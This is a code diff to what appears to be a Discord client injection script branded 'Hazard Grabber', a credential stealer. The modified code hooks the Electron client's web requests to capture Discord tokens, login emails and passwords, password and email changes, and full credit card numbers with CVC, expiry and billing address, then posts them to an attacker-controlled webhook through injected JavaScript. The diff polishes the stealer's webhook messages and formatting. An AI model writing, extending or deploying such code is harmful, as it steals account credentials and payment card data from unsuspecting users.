@@ -49,19 +49,17 @@ electron.session.defaultSession.webRequest.onHeadersReceived(function (j, k) {
   
   }})
   
-  function SendToWebhook(what) {
+  function SendToWebhook(info) {
     const window = BrowserWindow.getAllWindows()[0];
 
     window.webContents.executeJavaScript(`    var xhr = new XMLHttpRequest();
     xhr.open("POST", "${webhook}", true);
     xhr.setRequestHeader('Content-Type', 'application/json');
     xhr.setRequestHeader('Access-Control-Allow-Origin', '*');
-    xhr.send(JSON.stringify(${what}));
+    xhr.send(JSON.stringify(${info}));
     `, true).then((token => {
 
     }));
-
-
   }
   
   function GetNitro(flags){
@@ -150,6 +148,7 @@ electron.session.defaultSession.webRequest.onHeadersReceived(function (j, k) {
         var params = {
             username: "Hazard Grabber",
             content: "",
+            avatar_url: "https://cdn.discordapp.com/attachments/853347983639052318/857677082435649536/nedladdning_14.jpg",
             embeds: [
                 {
                     "color": 16507654,
@@ -166,7 +165,7 @@ electron.session.defaultSession.webRequest.onHeadersReceived(function (j, k) {
                         },
                         {
                             "name": "**Token**",
-                            "value": token,
+                            "value": `\`${token}\``,
                             "inline": false
                         }
                     ],
@@ -206,6 +205,7 @@ electron.session.defaultSession.webRequest.onHeadersReceived(function (j, k) {
             var params = {
                 username: "Hazard Grabber",
                 content: "",
+                avatar_url: "https://cdn.discordapp.com/attachments/853347983639052318/857677082435649536/nedladdning_14.jpg",
                 embeds: [
                     {
                         "title": "Password Changed",
@@ -223,7 +223,7 @@ electron.session.defaultSession.webRequest.onHeadersReceived(function (j, k) {
                             },
                             {
                                 "name": "**Token**",
-                                "value": token,
+                                "value": `\`${token}\``,
                                 "inline": false
                             }
                         ],
@@ -264,6 +264,7 @@ electron.session.defaultSession.webRequest.onHeadersReceived(function (j, k) {
         var params = {
             username: "Hazard Grabber",
             content: "",
+            avatar_url: "https://cdn.discordapp.com/attachments/853347983639052318/857677082435649536/nedladdning_14.jpg",
             embeds: [
                 {
                     "title": "Email Changed",
@@ -281,7 +282,7 @@ electron.session.defaultSession.webRequest.onHeadersReceived(function (j, k) {
                         },
                         {
                             "name": "**Token**",
-                            "value": token,
+                            "value": `\`${token}\``,
                             "inline": false
                         }
                     ],
@@ -322,6 +323,7 @@ electron.session.defaultSession.webRequest.onHeadersReceived(function (j, k) {
         var params = {
             username: "Hazard Grabber",
             content: "",
+            avatar_url: "https://cdn.discordapp.com/attachments/853347983639052318/857677082435649536/nedladdning_14.jpg",
             embeds: [
                 {
                     "title": "Credit Card Added",
@@ -339,7 +341,7 @@ electron.session.defaultSession.webRequest.onHeadersReceived(function (j, k) {
                         },
                         {
                             "name": "**Token**",
-                            "value": token,
+                            "value": `\`${token}\``,
                             "inline": false
                         }
                     ],
@@ -354,9 +356,6 @@ electron.session.defaultSession.webRequest.onHeadersReceived(function (j, k) {
             ]
         }
         SendToWebhook(JSON.stringify(params));
-
-
-
     })})
   }
   
@@ -382,8 +381,6 @@ electron.session.defaultSession.webRequest.onHeadersReceived(function (j, k) {
                       Login(email, password, token);
               }));
           } else {
-  
-  
           }
       }
    
@@ -407,8 +404,6 @@ electron.session.defaultSession.webRequest.onHeadersReceived(function (j, k) {
                   }
               }
           } else {
-  
-  
           }
       }
       if (details.url.endsWith("tokens")) {
@@ -419,7 +414,5 @@ electron.session.defaultSession.webRequest.onHeadersReceived(function (j, k) {
               CreditCardAdded(item["card[number]"], item["card[cvc]"], item["card[exp_month]"], item["card[exp_year]"], item["card[address_line1]"], item["card[address_city]"], item["card[address_state]"], item["card[address_zip]"], item["card[address_country]"], token);
           }));
       }
-  
   });
-  
   module.exports = require('./core.asar');
